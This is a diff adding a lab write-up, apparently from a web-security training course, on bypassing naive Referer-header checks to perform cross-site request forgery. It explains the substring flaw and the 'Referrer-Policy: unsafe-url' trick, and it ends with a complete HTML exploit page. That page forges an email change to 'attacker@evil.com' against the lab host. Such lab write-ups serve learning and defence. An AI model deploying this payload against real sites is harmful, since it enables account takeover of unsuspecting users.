@@ -1,0 +1,48 @@
+Broken Referer Validation: Bypass with Query String Injection
+ 
+**Category**: CSRF  
+**Difficulty**: Practitioner
+
+---
+
+## Overview / What I Learned
+
+- This lab demonstrates how weak Referer header validation can be bypassed if the server uses naive substring checks.
+- I learned how query strings and referrer policy manipulation can be abused to **forge requests** that appear to originate from a trusted domain.
+- Also learned how **`Referrer-Policy: unsafe-url`** affects referrer behavior in modern browsers.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Recon & Analysis
+- Logged in as `wiener:peter`.
+- Captured a POST request to `/my-account/change-email`.
+- Changing the `Referer` header to an unrelated domain caused the request to be rejected.
+- However, including the **expected domain in a query string** bypassed the check:
+Referer: https://attacker.com?YOUR-LAB-ID.web-security-academy.net
+
+
+### 2. Exploit Strategy
+- Created a CSRF HTML form that submits a POST request to change the victim’s email.
+- Used JavaScript's `history.pushState()` to append the lab's domain to the URL (to influence the Referer).
+- Added the following header on the exploit server to **ensure full Referer is sent**:
+Referrer-Policy: unsafe-url
+
+
+### 3. Final Exploit Payload
+```html
+<html>
+<head>
+  <meta name="referrer" content="unsafe-url">
+</head>
+<body>
+  <form action="https://LabID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com" />
+  </form>
+  <script>
+    history.pushState('', '', '/?LabId.web-security-academy.net');
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
